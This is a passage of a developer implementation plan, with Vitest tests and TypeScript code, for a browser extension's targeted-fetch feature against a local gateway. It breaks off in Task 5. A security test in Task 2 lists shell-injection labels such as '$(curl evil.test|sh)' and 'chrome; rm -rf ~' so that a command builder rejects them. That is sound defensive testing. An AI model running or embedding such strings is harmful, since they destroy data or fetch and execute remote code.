# C3.1 — Targeted Fetch on a Resolve Miss — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** On a recognised page the gateway has never indexed, let the user ask their gateway to fetch that one item through the connector that owns it, then see the answer — without ever firing an outbound request they did not ask for, or claiming an outcome we have not established.

**Architecture:** One new message (`fetch`) carrying a `FetchOutcome`; the panel orchestrates and re-issues the **existing** `resolve` message on success. `panel-view.ts` stays pure and owns every user-facing string; `panel-in-page.ts` owns the state machine. The wire shape exists only inside `gateway-client.ts`'s parser.

**Tech Stack:** TypeScript (strict, no `any`), Vitest (node env; jsdom via docblock for DOM tests), esbuild, Biome, bun.

**Spec:** [`docs/superpowers/specs/2026-08-09-c3-1-targeted-fetch-design.md`](../specs/2026-08-09-c3-1-targeted-fetch-design.md)

## Global Constraints

- TypeScript **strict**; **no `any`** — cross-boundary data is `unknown`, narrowed by a guard.
- **No `console.*` in `src/`.** Tests and `scripts/` may log.
- **DOM tests opt into jsdom with a first-line `// @vitest-environment jsdom`** — a
  line comment, which is this repo's convention across all nine DOM test files, not
  the `/** … */` block form. `panel-view.test.ts` and `panel-in-page.test.ts`
  already carry it: **preserve it.** Rewriting a test file wholesale and dropping
  that line makes every DOM test fail on a missing `document`, which reads as a
  broken implementation rather than a missing directive. The new
  `scope-command.test.ts` is pure string building and must **not** have it.
- **Never log the bearer token or the pairing code.**
- **Loopback only** — no network destination beyond `127.0.0.1` / `localhost`.
- **Every gateway-provided string renders via `textContent`**, never `innerHTML`.
- **`panel-view.ts` owns all user-facing copy.** `HeaderState` arms carry structured data (`kind`, `reason`, `product`, `scopeGap`) — never pre-built prose.
- Green bar: `bun run typecheck && bun run lint && bun run test && bun run build && bun run check-build`.
- `CHANGELOG.md` entry under `## [Unreleased]` for anything user-visible.

**Green-bar timing.** Unlike the #38 plan, **every task here ends green**. The type changes are additive except Task 1, which is a deletion small enough to complete inside its own task. A red `tsc` at the end of any task is a defect, not a sequencing artefact.

**Baseline:** branch `worktree-c3-1-targeted-fetch` off `9441491` (merged `main`). 457 tests, 40 files, all five checks green.

## The contract, verified against merged upstream source

`C:/gitrep/Nimbus` @ v1.26.0 — `sync/targeted-fetch.ts`, `ipc/http-write-routes.ts`, `ipc/http-route-auth.ts`.

```
POST /v1/items/fetch      Authorization: Bearer <token>, scope `fetch`
Body: { url }

200 {status:"indexed", itemId} | {status:"not_found"} | {status:"unsupported_url"}
    {status:"no_targeted_fetch", service} | {status:"not_configured"} | {status:"rate_limited"}
400 {error:"missing_url"} · 403 {error:"insufficient_scope", required, granted}
404 {error:"fetch_disabled", hint} · 500 {error:"internal_error"}
```

Facts that constrain the code — do not re-derive these, and do not "improve" past them:

1. **`indexed` returns ONLY `itemId`.** No title, url or `modified_at`. The panel *cannot* build a resolved header from a fetch response; it must re-resolve.
2. **`not_configured` carries NO service name.** Only `no_targeted_fetch` does. The connector is named from `Recognition`, never from this response.
3. **Every outcome is a 200.** A miss is an answer.
4. **`rate_limited` makes no outbound provider call.** It is returned after failing to acquire a local token.
5. **`--set` REPLACES the scope set.** It does not append. The full desired set must be named.

## File Structure

**Modified:** `src/shared/types.ts`, `src/shared/messages.ts`, `src/background/gateway-client.ts`, `src/background/handlers.ts`, `src/background/service-worker.ts`, `src/panel/panel-view.ts`, `src/panel/panel-in-page.ts`, `scripts/screenshots/mock-gateway.ts`, `scripts/screenshots/gateway-fixtures.ts`, `CHANGELOG.md`, `docs/architecture.md`, `ROADMAP.md`.

**Created:** `src/shared/scope-command.ts` — pure builder for the `nimbus clip scopes` string, plus `test/unit/scope-command.test.ts`.

---

### Task 1: Prune `service` from resolve's ambiguous arm

Settled in the spec after three separate flags. It is parsed, guarded, carried, and rendered by nothing.

**Files:**
- Modify: `src/shared/types.ts` (`ResolveOutcome`), `src/background/gateway-client.ts` (`parseResolveBody`), `src/shared/messages.ts` (`isResolveOutcome`)
- Test: `test/unit/gateway-client.test.ts`, `test/unit/messages.test.ts`

**Interfaces:**
- Produces: `ResolveOutcome`'s `ambiguous` arm without `service`.

- [ ] **Step 1: Update the tests first (they currently assert the field)**

In `test/unit/gateway-client.test.ts`, the ambiguous test asserts a `service` on the outcome. Remove it from the expectation, and **delete the non-string-`service` rejection test added in #38's fix wave** — the field is gone, so there is nothing to reject.

Replace the ambiguous expectation's outcome with:

```ts
      outcome: {
        kind: "ambiguous", fetchable: false, truncated: false,
        candidates: [
          { id: "a", service: "jira", type: "issue", title: "One", url: "https://j.test/a" },
          { id: "b", service: "jira", type: "issue", title: "Two", url: null },
        ],
      },
```

Note the **candidates keep their own `service`** — that is a different field on a different type (`ResolveCandidate`), it is part of what identifies an item, and it stays.

Add one test proving the wire field is now ignored rather than rejected:

```ts
  it("ignores a service field on the ambiguous arm — it is no longer modelled", async () => {
    const doFetch = async () =>
      jsonRes({
        found: false, reason: "ambiguous", service: "jira",
        fetchable: false, truncated: true, candidates: [],
      });
    const r = await resolveItem("http://127.0.0.1:8765", "t", "https://x.test/", doFetch);
    expect(r.ok && r.outcome.kind === "ambiguous").toBe(true);
    expect(r.ok && r.outcome).not.toHaveProperty("service");
  });
```

In `test/unit/messages.test.ts`, remove `service` from the ambiguous outcome fixtures.

- [ ] **Step 2: Run the tests and watch them fail**

Run: `bunx vitest run test/unit/gateway-client.test.ts test/unit/messages.test.ts`
Expected: FAIL — the parser still emits `service`, so `not.toHaveProperty` fails.

- [ ] **Step 3: Remove the field**

`src/shared/types.ts` — the `ambiguous` arm becomes:

```ts
  | {
      readonly kind: "ambiguous";
      readonly fetchable: boolean;
      /** EMPTY whenever `truncated` — upstream sends no list rather than a sliced one. */
      readonly candidates: readonly ResolveCandidate[];
      readonly truncated: boolean;
    };
```

Delete the `service` line and update the surrounding doc comment: the reason `not-indexed` carries no service is unchanged, but add that `ambiguous` no longer carries one either, because the panel names the service from `Recognition` and a second source for the same fact is only a chance to disagree.

`src/background/gateway-client.ts` — in `parseResolveBody`'s ambiguous branch, delete the `const service = data["service"]` read and the `service:` property from the returned object. Delete the non-string rejection added in #38's fix wave.

`src/shared/messages.ts` — in `isResolveOutcome`'s ambiguous branch, delete the
`(v["service"] === null || typeof v["service"] === "string") &&` clause.

- [ ] **Step 4: Run the tests**

Run: `bun run typecheck && bunx vitest run test/unit/gateway-client.test.ts test/unit/messages.test.ts test/unit/panel-in-page.test.ts`
Expected: typecheck clean, all PASS. If `panel-in-page.test.ts` fails, a fixture there still sets `service` — remove it.

- [ ] **Step 5: Commit**

```bash
git add src/shared/types.ts src/background/gateway-client.ts src/shared/messages.ts test/unit
git commit -m "refactor(resolve): drop the unused service field from the ambiguous arm"
```

---

### Task 2: Build the scope command instead of templating it

Retro-fixes a defect in shipped code: the `needs-scope` message renders a literal `<label>` that does not paste, and a hardcoded scope set that would strip `agents` from a token that had it.

**Files:**
- Create: `src/shared/scope-command.ts`, `test/unit/scope-command.test.ts`
- Modify: `src/shared/types.ts` (`ScopeGap`), `src/background/gateway-client.ts` (keep the 403 body), `src/shared/messages.ts`, `src/background/handlers.ts`, `src/panel/panel-view.ts`, `src/panel/panel-in-page.ts`

**Interfaces:**
- Produces:
  ```ts
  export interface ScopeGap {
    readonly label: string;
    readonly required: string;
    readonly granted: readonly string[];
  }
  export function scopeCommand(gap: ScopeGap): string | null;   // null = unsafe label
  ```
  `HeaderState`'s `needs-scope` arm gains `readonly scopeGap: ScopeGap | null`.

- [ ] **Step 1: Write the failing test**

Create `test/unit/scope-command.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { scopeCommand } from "../../src/shared/scope-command.ts";

describe("scopeCommand", () => {
  it("names the real label and the full resulting set", () => {
    expect(
      scopeCommand({ label: "chrome", required: "fetch", granted: ["clip", "briefs", "resolve"] }),
    ).toBe("nimbus clip scopes chrome --set clip,briefs,resolve,fetch");
  });

  it("preserves scopes the client knows nothing about — --set REPLACES the set", () => {
    // A hardcoded "clip,briefs,fetch" would silently strip `agents`.
    expect(scopeCommand({ label: "work", required: "fetch", granted: ["clip", "agents"] })).toBe(
      "nimbus clip scopes work --set clip,agents,fetch",
    );
  });

  it("does not duplicate a scope that is somehow already granted", () => {
    expect(
      scopeCommand({ label: "x", required: "resolve", granted: ["clip", "resolve"] }),
    ).toBe("nimbus clip scopes x --set clip,resolve");
  });

  it("handles an empty granted set", () => {
    expect(scopeCommand({ label: "x", required: "fetch", granted: [] })).toBe(
      "nimbus clip scopes x --set fetch",
    );
  });

  // SECURITY. The label is gateway-supplied (it comes back from pair/confirm) and
  // the gateway does NOT constrain its characters — pairing-window.ts takes
  // `label: string` unvalidated. We render a command the user is invited to paste
  // into a shell, so anything that is not a plain identifier gets NO command at
  // all. Quoting is not a fix: in POSIX shells `$(...)` and backticks execute
  // inside double quotes, and correct escaping across bash/pwsh/cmd is not
  // achievable from here.
  it("returns null for a label that is not a plain identifier", () => {
    for (const label of [
      "my laptop",
      "chrome; rm -rf ~",
      "$(curl evil.test|sh)",
      "`id`",
      "a\nb",
      "",
      "x".repeat(65),
    ]) {
      expect(scopeCommand({ label, required: "fetch", granted: ["clip"] })).toBeNull();
    }
  });

  it("accepts the identifier characters a label legitimately uses", () => {
    for (const label of ["chrome", "work-laptop", "asaf.dev", "box_2"]) {
      expect(scopeCommand({ label, required: "fetch", granted: ["clip"] })).toBe(
        `nimbus clip scopes ${label} --set clip,fetch`,
      );
    }
  });
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `bunx vitest run test/unit/scope-command.test.ts`
Expected: FAIL — module not found.

- [ ] **Step 3: Write the builder**

Create `src/shared/scope-command.ts`:

```ts
import type { ScopeGap } from "./types.ts";

/**
 * The exact command that grants a paired device a scope it lacks.
 *
 * Built, never templated. Two reasons, both learned the hard way:
 *
 * 1. `nimbus clip scopes <label> --set <a,b>` REPLACES the scope set — it does not
 *    append (packages/cli/src/commands/clip.ts: runClipScopes passes the parsed
 *    array straight through). So a message reading `--set ...,fetch` is not valid
 *    guidance, and a hardcoded set would silently strip a scope the token already
 *    had. The command must name every scope the token should end up with.
 * 2. A literal `<label>` does not paste. The gateway's 403 carries `granted`, and
 *    the pairing label is stored client-side, so the real values are available.
 */
/**
 * A device label we are willing to put into a command the user will paste into a
 * shell. Deliberately strict.
 *
 * The label is GATEWAY-SUPPLIED — it comes back from `pair/confirm` — and the
 * gateway does not constrain it (`pairingWindow.open(label: string, …)` takes any
 * string). Quoting is not a defence: in POSIX shells `$(...)` and backticks
 * execute inside double quotes, and there is no escaping that is correct across
 * bash, pwsh and cmd at once. So anything that is not a plain identifier gets no
 * command rendered at all.
 */
const SAFE_LABEL = /^[A-Za-z0-9._-]{1,64}$/;

/**
 * Returns null when the label cannot be safely embedded. The caller then renders
 * generic guidance ("run `nimbus clip status` to find your device") rather than a
 * command — refusing to print one is strictly better than printing one that could
 * carry an injection into the user's own shell.
 */
export function scopeCommand(gap: ScopeGap): string | null {
  if (!SAFE_LABEL.test(gap.label)) {
    return null;
  }
  const scopes = gap.granted.includes(gap.required)
    ? [...gap.granted]
    : [...gap.granted, gap.required];
  return `nimbus clip scopes ${gap.label} --set ${scopes.join(",")}`;
}
```

**Why validate instead of escape.** This is the one string in the product we
actively invite the user to run in a shell. A hostile gateway implies local
compromise already, so this is defence in depth rather than the primary boundary —
but the cost of getting it right is one regex, and the cost of getting it wrong is
handing someone a command that does something other than what it reads.

Add to `src/shared/types.ts`:

```ts
/**
 * What a 403 tells us about a scope the paired token lacks, plus the label needed
 * to name the device in the fix command.
 *
 * `granted` comes from the gateway's own 403 body (`insufficientScopeBody` in
 * ipc/http-route-auth.ts), NOT from a client guess — `--set` replaces the set, so
 * guessing it would strip scopes the token already holds.
 */
export interface ScopeGap {
  readonly label: string;
  readonly required: string;
  readonly granted: readonly string[];
}
```

- [ ] **Step 4: Run the test**

Run: `bunx vitest run test/unit/scope-command.test.ts`
Expected: PASS.

- [ ] **Step 5: Thread the 403 body through**

`gateway-client.ts` — `resolveItem`'s failure arm gains an optional gap. Change its return type and the 403 branch:

```ts
): Promise<
  | { ok: true; outcome: ResolveOutcome }
  | { ok: false; reason: ResolveError; scopeGap?: { required: string; granted: string[] } }
> {
```

```ts
  if (res.status === 403) {
    const body = await readJson(res);
    const gap = parseScopeGap(body);
    return gap === null
      ? { ok: false, reason: "insufficient_scope" }
      : { ok: false, reason: "insufficient_scope", scopeGap: gap };
  }
```

with a parser beside the others:

```ts
/** The 403 body's scope detail. Absent or malformed => omit it; the panel then
 *  falls back to generic guidance rather than inventing a command. */
function parseScopeGap(v: unknown): { required: string; granted: string[] } | null {
  if (!isObject(v) || typeof v["required"] !== "string" || !Array.isArray(v["granted"])) {
    return null;
  }
  const granted: string[] = [];
  for (const s of v["granted"]) {
    if (typeof s !== "string") {
      return null;
    }
    granted.push(s);
  }
  return { required: v["required"], granted };
}
```

`handlers.ts` — `handleResolve` attaches the label from the connection it already holds:

```ts
  if (!r.ok) {
    return r.scopeGap === undefined
      ? { kind: "resolve", ok: false, recognition, reason: r.reason }
      : {
          kind: "resolve",
          ok: false,
          recognition,
          reason: r.reason,
          scopeGap: { label: conn.label, ...r.scopeGap },
        };
  }
```

Widen `ResolveDeps.resolveItem`'s type to match the client's new return shape, and add `readonly scopeGap?: ScopeGap` to `ResolveResponse`'s failure arm in `messages.ts`, with a guard clause:

```ts
function isScopeGap(v: unknown): v is ScopeGap {
  return (
    isObject(v) &&
    typeof v["label"] === "string" &&
    typeof v["required"] === "string" &&
    Array.isArray(v["granted"]) &&
    v["granted"].every((s) => typeof s === "string")
  );
}
```

and in `isResolveResponse`'s failure branch:

```ts
  return (
    v["ok"] === false &&
    typeof v["reason"] === "string" &&
    (v["scopeGap"] === undefined || isScopeGap(v["scopeGap"]))
  );
```

- [ ] **Step 6: Render the built command**

`panel-view.ts` — the `needs-scope` arm becomes:

```ts
  | { readonly kind: "needs-scope"; readonly surface: string; readonly scopeGap: ScopeGap | null }
```

and its render:

```ts
  if (state.kind === "needs-scope") {
    box.append(line(doc, "nimbus-related__status", "This pairing can't resolve pages yet."));
    // Null when the 403 carried no detail, OR when the device label is not safe to
    // put in a shell command. Both fall back to guidance that names the tool
    // without pretending to know the exact invocation.
    const cmd = state.scopeGap === null ? null : scopeCommand(state.scopeGap);
    box.append(
      line(
        doc,
        "nimbus-related__status",
        cmd === null
          ? "Grant it on the gateway: run nimbus clip status to find this device, then nimbus clip scopes."
          : `Grant it on the gateway: ${cmd}`,
      ),
    );
    return box;
  }
```

`panel-in-page.ts` — `headerFrom` passes the gap through:

```ts
    if (res.reason === "insufficient_scope" && surface !== null) {
      return { kind: "needs-scope", surface, scopeGap: res.scopeGap ?? null };
    }
```

Add to `test/unit/panel-view.test.ts`:

```ts
it("renders the real label and the full resulting scope set", () => {
  const el = renderHeader(document, {
    kind: "needs-scope", surface: "GitHub PR · a/b #1",
    scopeGap: { label: "chrome", required: "resolve", granted: ["clip", "briefs"] },
  });
  expect(el.textContent).toContain("nimbus clip scopes chrome --set clip,briefs,resolve");
  // The literal placeholder does not paste, and an ellipsis is not valid CLI syntax.
  expect(el.textContent).not.toContain("<label>");
  expect(el.textContent).not.toContain("...");
});

it("falls back to generic guidance when the 403 carried no scope detail", () => {
  const el = renderHeader(document, {
    kind: "needs-scope", surface: "S", scopeGap: null,
  });
  expect(el.textContent).toContain("nimbus clip scopes");
  expect(el.textContent).not.toContain("--set");
});
```

- [ ] **Step 7: Run the full suite**

Run: `bun run typecheck && bun run test`
Expected: typecheck clean, all PASS.

- [ ] **Step 8: Commit**

```bash
git add src test
git commit -m "fix(panel): build the scope command from the 403 and the real device label"
```

---

### Task 3: Fetch domain types

**Files:** Modify `src/shared/types.ts`. No test cycle — pure type declarations.

**Interfaces:**
- Produces: `FetchOutcome`, `FetchError`.

- [ ] **Step 1: Write the types**

```ts
/**
 * A successful call to the targeted-fetch route. Every arm is HTTP 200 — upstream
 * is explicit that "a miss is a legitimate answer to a well-formed request, not a
 * client error" (ipc/http-write-routes.ts).
 *
 * The three wire arms `not_found`, `unsupported_url` and `no_targeted_fetch`
 * collapse into `unfetchable`: they differ in WHY the gateway declined but are
 * identical in what the user can do about it, which is nothing. `not_configured`
 * stays separate because C3.1's done-when requires it — an unconfigured connector
 * must "say so plainly instead of retrying".
 *
 * `not-configured` carries no service name because the WIRE carries none (only
 * `no_targeted_fetch` does). The panel names the connector from `Recognition`.
 */
export type FetchOutcome =
  | { readonly kind: "indexed"; readonly itemId: string }
  | { readonly kind: "unfetchable" }
  | { readonly kind: "not-configured" }
  | { readonly kind: "rate-limited" };

/**
 * `timeout` is NOT a failure and must never be collapsed into `unreachable`.
 *
 * It means our 30s timer fired: the gateway may still be completing the fetch.
 * Reporting it as a failure would assert something we have not established, and
 * would invite a retry that fires a second outbound provider request for work
 * already done. `unreachable` means the connection itself failed — nothing was
 * sent, and a retry is safe.
 */
export type FetchError =
  | "not_paired"
  | "unauthorized"
  | "insufficient_scope"
  /** 404 — this gateway has no fetch route, or the seam is disabled. */
  | "unsupported"
  | "timeout"
  | "unreachable"
  | "server_error";
```

- [ ] **Step 2: Verify nothing broke**

Run: `bun run typecheck && bun run test`
Expected: clean and green — these types are additive and unused so far.

- [ ] **Step 3: Commit**

```bash
git add src/shared/types.ts
git commit -m "types: model the targeted-fetch outcomes"
```

---

### Task 4: The fetch client, with the timeout/unreachable split

**Files:** Modify `src/background/gateway-client.ts`. Test: `test/unit/gateway-client.test.ts`.

**Interfaces:**
- Produces:
  ```ts
  export async function fetchItem(
    origin: string, token: string, pageUrl: string, doFetch?: FetchLike,
  ): Promise<
    | { ok: true; outcome: FetchOutcome }
    | { ok: false; reason: FetchError; scopeGap?: { required: string; granted: string[] } }
  >
  ```

- [ ] **Step 1: Write the failing tests**

```ts
describe("fetchItem", () => {
  function jsonRes(body: unknown, status = 200): Response {
    return new Response(JSON.stringify(body), {
      status, headers: { "content-type": "application/json" },
    });
  }

  it("POSTs the url with a bearer header and no url in the query string", async () => {
    const calls: Array<{ url: string; init?: RequestInit }> = [];
    const doFetch = async (url: string, init?: RequestInit) => {
      calls.push({ url, init });
      return jsonRes({ status: "indexed", itemId: "i1" });
    };
    await fetchItem("http://127.0.0.1:8765", "tok", "https://github.com/a/b/pull/1", doFetch);

    const call = calls[0];
    expect(call?.url).toBe("http://127.0.0.1:8765/v1/items/fetch");
    expect(call?.init?.method).toBe("POST");
    expect(JSON.parse(String(call?.init?.body))).toEqual({ url: "https://github.com/a/b/pull/1" });
    expect((call?.init?.headers as Record<string, string>)["authorization"]).toBe("Bearer tok");
    // The token belongs in the header and nowhere else.
    expect(call?.url).not.toContain("tok");
    expect(String(call?.init?.body)).not.toContain("tok");
  });

  it("maps indexed with its itemId", async () => {
    const doFetch = async () => jsonRes({ status: "indexed", itemId: "gh-482" });
    expect(await fetchItem("http://127.0.0.1:8765", "t", "https://x.test/", doFetch)).toEqual({
      ok: true, outcome: { kind: "indexed", itemId: "gh-482" },
    });
  });

  it("collapses the three no-action arms into unfetchable", async () => {
    for (const status of ["not_found", "unsupported_url", "no_targeted_fetch"]) {
      const doFetch = async () => jsonRes({ status, service: "github" });
      const r = await fetchItem("http://127.0.0.1:8765", "t", "https://x.test/", doFetch);
      expect(r).toEqual({ ok: true, outcome: { kind: "unfetchable" } });
    }
  });

  it("keeps not_configured distinct — the user can act on it", async () => {
    const doFetch = async () => jsonRes({ status: "not_configured" });
    expect(await fetchItem("http://127.0.0.1:8765", "t", "https://x.test/", doFetch)).toEqual({
      ok: true, outcome: { kind: "not-configured" },
    });
  });

  it("maps rate_limited", async () => {
    const doFetch = async () => jsonRes({ status: "rate_limited" });
    expect(await fetchItem("http://127.0.0.1:8765", "t", "https://x.test/", doFetch)).toEqual({
      ok: true, outcome: { kind: "rate-limited" },
    });
  });

  it("rejects indexed without an itemId rather than inventing one", async () => {
    const doFetch = async () => jsonRes({ status: "indexed" });
    expect(await fetchItem("http://127.0.0.1:8765", "t", "https://x.test/", doFetch)).toEqual({
      ok: false, reason: "server_error",
    });
  });

  it("treats an unknown status as server_error, never as a miss", async () => {
    for (const body of [null, {}, { status: "vibes" }]) {
      const doFetch = async () => jsonRes(body);
      expect(await fetchItem("http://127.0.0.1:8765", "t", "https://x.test/", doFetch)).toEqual({
        ok: false, reason: "server_error",
      });
    }
  });

  it("maps 403 to insufficient_scope and keeps the scope detail", async () => {
    const doFetch = async () =>
      jsonRes({ error: "insufficient_scope", required: "fetch", granted: ["clip", "resolve"] }, 403);
    expect(await fetchItem("http://127.0.0.1:8765", "t", "https://x.test/", doFetch)).toEqual({
      ok: false, reason: "insufficient_scope",
      scopeGap: { required: "fetch", granted: ["clip", "resolve"] },
    });
  });

  it("maps 401 / 404 / 400 / 500", async () => {
    const cases: Array<[unknown, number, string]> = [
      [{ error: "unauthorized" }, 401, "unauthorized"],
      [{ error: "fetch_disabled" }, 404, "unsupported"],
      [{ error: "missing_url" }, 400, "server_error"],
      [{}, 500, "server_error"],
    ];
    for (const [body, status, reason] of cases) {
      const doFetch = async () => jsonRes(body, status);
      expect(await fetchItem("http://127.0.0.1:8765", "t", "https://x.test/", doFetch)).toEqual({
        ok: false, reason,
      });
    }
  });

  // THE test for this task. These two must not collapse: one means the gateway may
  // still be working, the other means nothing was sent.
  it("maps our own timeout to `timeout`, NOT to `unreachable`", async () => {
    const abort = async () => {
      throw Object.assign(new Error("The operation was aborted."), { name: "AbortError" });
    };
    expect(await fetchItem("http://127.0.0.1:8765", "t", "https://x.test/", abort)).toEqual({
      ok: false, reason: "timeout",
    });
  });

  it("maps a transport failure to `unreachable`, NOT to `timeout`", async () => {
    const refused = async () => {
      throw new TypeError("Failed to fetch");
    };
    expect(await fetchItem("http://127.0.0.1:8765", "t", "https://x.test/", refused)).toEqual({
      ok: false, reason: "unreachable",
    });
  });
});
```

- [ ] **Step 2: Run and watch them fail**

Run: `bunx vitest run test/unit/gateway-client.test.ts`
Expected: FAIL — `fetchItem` is not exported.

- [ ] **Step 3: Implement**

Add `itemsFetch: "/v1/items/fetch"` to `GATEWAY_PATHS` in `src/shared/gateway.ts` (the map is already the single home for contracted paths — no new map).

In `gateway-client.ts`:

```ts
const FETCH_TIMEOUT_MS = 30_000;

/**
 * True for the abort our own timeout raises. Kept narrow deliberately: anything
 * else — DNS, connection refused, a killed service worker — is `unreachable`,
 * and the two must not be confused (see FetchError's doc comment).
 */
function isAbortError(err: unknown): boolean {
  return isObject(err) && err["name"] === "AbortError";
}

function parseFetchBody(data: unknown): FetchOutcome | null {
  if (!isObject(data) || typeof data["status"] !== "string") {
    return null;
  }
  const status = data["status"];
  if (status === "indexed") {
    return typeof data["itemId"] === "string" ? { kind: "indexed", itemId: data["itemId"] } : null;
  }
  if (status === "not_found" || status === "unsupported_url" || status === "no_targeted_fetch") {
    return { kind: "unfetchable" };
  }
  if (status === "not_configured") {
    return { kind: "not-configured" };
  }
  if (status === "rate_limited") {
    return { kind: "rate-limited" };
  }
  return null;
}

/**
 * `POST /v1/items/fetch` — a WRITE under the `fetch` scope. Upstream models it as
 * an explicit write, not a read with side effects, because it causes an OUTBOUND
 * request to a configured provider under the user's stored credential. Nothing in
 * this client may call it without a user gesture behind it.
 */
export async function fetchItem(
  origin: string,
  token: string,
  pageUrl: string,
  doFetch: FetchLike = fetch,
): Promise<
  | { ok: true; outcome: FetchOutcome }
  | { ok: false; reason: FetchError; scopeGap?: { required: string; granted: string[] } }
> {
  let res: Response;
  try {
    res = await postJson(
      doFetch,
      origin,
      "itemsFetch",
      { url: pageUrl },
      { authorization: `Bearer ${token}` },
      FETCH_TIMEOUT_MS,
    );
  } catch (err) {
    return { ok: false, reason: isAbortError(err) ? "timeout" : "unreachable" };
  }
  if (res.status === 200) {
    const outcome = parseFetchBody(await readJson(res));
    return outcome === null ? { ok: false, reason: "server_error" } : { ok: true, outcome };
  }
  if (res.status === 401) {
    return { ok: false, reason: "unauthorized" };
  }
  if (res.status === 403) {
    const gap = parseScopeGap(await readJson(res));
    return gap === null
      ? { ok: false, reason: "insufficient_scope" }
      : { ok: false, reason: "insufficient_scope", scopeGap: gap };
  }
  if (res.status === 404) {
    return { ok: false, reason: "unsupported" };
  }
  return { ok: false, reason: "server_error" };
}
```

- [ ] **Step 4: Run the tests**

Run: `bun run typecheck && bunx vitest run test/unit/gateway-client.test.ts`
Expected: typecheck clean, all PASS.

- [ ] **Step 5: Commit**

```bash
git add src test
git commit -m "feat(gateway): call POST /v1/items/fetch and split timeout from unreachable"
```

---

### Task 5: Message envelope, guards, and the recogniser gate

**Files:** Modify `src/shared/messages.ts`, `src/background/handlers.ts`, `src/background/service-worker.ts`. Test: `test/unit/messages.test.ts`, `test/unit/handlers.test.ts`, `test/unit/service-worker.test.ts`.

**Interfaces:**
- Produces: `FetchRequest { kind:"fetch"; pageUrl }`, `FetchResponse`, `isFetchRequest`, `isFetchResponse`, `handleFetch`, `FetchDeps`.

- [ ] **Step 1: Write the failing tests**

`test/unit/handlers.test.ts` — the security assertion first:

```ts
describe("handleFetch", () => {
  const conn = { origin: "http://127.0.0.1:8765", token: "t", label: "chrome", pairedAt: 0 };

  it("makes NO gateway call for an unrecognised page", async () => {
    let called = false;
    const res = await handleFetch(
      {
        getOrigins: async () => [],
        getConnection: async () => conn,
        fetchItem: async () => {
          called = true;
          return { ok: false as const, reason: "server_error" as const };
        },
      },
      { kind: "fetch", pageUrl: "https://example.com/whatever" },
    );

    // This is the security boundary: a fetch is an OUTBOUND request under the
    // user's stored credential, so an unrecognised URL must never reach it.
    expect(called).toBe(false);
    expect(res).toEqual({
      kind: "fetch", ok: false,
      recognition: { ok: false, reason: "unknown-host" },
      reason: "server_error",
    });
  });

  it("passes the recogniser's resolveUrl and carries the outcome", async () => {
    const seen: string[] = [];
    const res = await handleFetch(
      {
        getOrigins: async () => [],
        getConnection: async () => conn,
        fetchItem: async (_o, _t, url) => {
          seen.push(url);
          return { ok: true as const, outcome: { kind: "indexed" as const, itemId: "i1" } };
        },
      },
      { kind: "fetch", pageUrl: "https://github.com/a/b/pull/1" },
    );

    expect(seen).toEqual(["https://github.com/a/b/pull/1"]);
    expect(res).toEqual({
      kind: "fetch", ok: true,
      recognition: expect.objectContaining({ ok: true, label: "GitHub PR" }),
      outcome: { kind: "indexed", itemId: "i1" },
    });
  });

  it("attaches the device label to a scope gap", async () => {
    const res = await handleFetch(
      {
        getOrigins: async () => [],
        getConnection: async () => conn,
        fetchItem: async () => ({
          ok: false as const,
          reason: "insufficient_scope" as const,
          scopeGap: { required: "fetch", granted: ["clip", "briefs"] },
        }),
      },
      { kind: "fetch", pageUrl: "https://github.com/a/b/pull/1" },
    );

    expect(res).toMatchObject({
      ok: false, reason: "insufficient_scope",
      scopeGap: { label: "chrome", required: "fetch", granted: ["clip", "briefs"] },
    });
  });

  it("short-circuits when not paired", async () => {
    const res = await handleFetch(
      { getOrigins: async () => [], getConnection: async () => null, fetchItem: async () => {
          throw new Error("must not be called");
        } },
      { kind: "fetch", pageUrl: "https://github.com/a/b/pull/1" },
    );
    expect(res).toMatchObject({ ok: false, reason: "not_paired" });
  });
});
```

`test/unit/messages.test.ts`:

```ts
describe("isFetchResponse", () => {
  const recognition = {
    ok: true, product: "github", kind: "pr",
    label: "GitHub PR", ref: "a/b #1", resolveUrl: "https://github.com/a/b/pull/1",
  };

  it("accepts each outcome", () => {
    for (const outcome of [
      { kind: "indexed", itemId: "i1" },
      { kind: "unfetchable" },
      { kind: "not-configured" },
      { kind: "rate-limited" },
    ]) {
      expect(isFetchResponse({ kind: "fetch", ok: true, recognition, outcome })).toBe(true);
    }
  });

  it("rejects indexed without an itemId and an unknown kind", () => {
    for (const outcome of [{ kind: "indexed" }, { kind: "elsewhere" }]) {
      expect(isFetchResponse({ kind: "fetch", ok: true, recognition, outcome })).toBe(false);
    }
  });

  it("accepts a failure arm with a scope gap", () => {
    expect(
      isFetchResponse({
        kind: "fetch", ok: false, recognition, reason: "insufficient_scope",
        scopeGap: { label: "chrome", required: "fetch", granted: ["clip"] },
      }),
    ).toBe(true);
  });
});
```

- [ ] **Step 2: Run and watch them fail**

Run: `bunx vitest run test/unit/handlers.test.ts test/unit/messages.test.ts`
Expected: FAIL — `handleFetch` / `isFetchResponse` do not exist.

- [ ] **Step 3: Implement**

`messages.ts` — mirror the resolve envelope:

```ts
export interface FetchRequest {
  readonly kind: "fetch";
  readonly pageUrl: string;
}

export type FetchResponse =
  | {
      readonly kind: "fetch";
      readonly ok: true;
      readonly recognition: Recognition;
      readonly outcome: FetchOutcome;
    }
  | {
      readonly kind: "fetch";
      readonly ok: false;
      readonly recognition: Recognition;
      readonly reason: FetchError;
      readonly scopeGap?: ScopeGap;
    };

export function isFetchRequest(v: unknown): v is FetchRequest {
  return isObject(v) && v["kind"] === "fetch" && typeof v["pageUrl"] === "string";
}

function isFetchOutcome(v: unknown): v is FetchOutcome {
  if (!isObject(v)) {
    return false;
  }
  if (v["kind"] === "indexed") {
    return typeof v["itemId"] === "string";
  }
  return v["kind"] === "unfetchable" || v["kind"] === "not-configured" || v["kind"] === "rate-limited";
}

export function isFetchResponse(v: unknown): v is FetchResponse {
  if (!isObject(v) || v["kind"] !== "fetch" || !isRecognition(v["recognition"])) {
    return false;
  }
  if (v["ok"] === true) {
    return isFetchOutcome(v["outcome"]);
  }
  return (
    v["ok"] === false &&
    typeof v["reason"] === "string" &&
    (v["scopeGap"] === undefined || isScopeGap(v["scopeGap"]))
  );
}
```

`handlers.ts`:

```ts
export interface FetchDeps {
  readonly getOrigins: () => Promise<readonly ConfiguredOrigin[]>;
  readonly getConnection: () => Promise<Connection | null>;
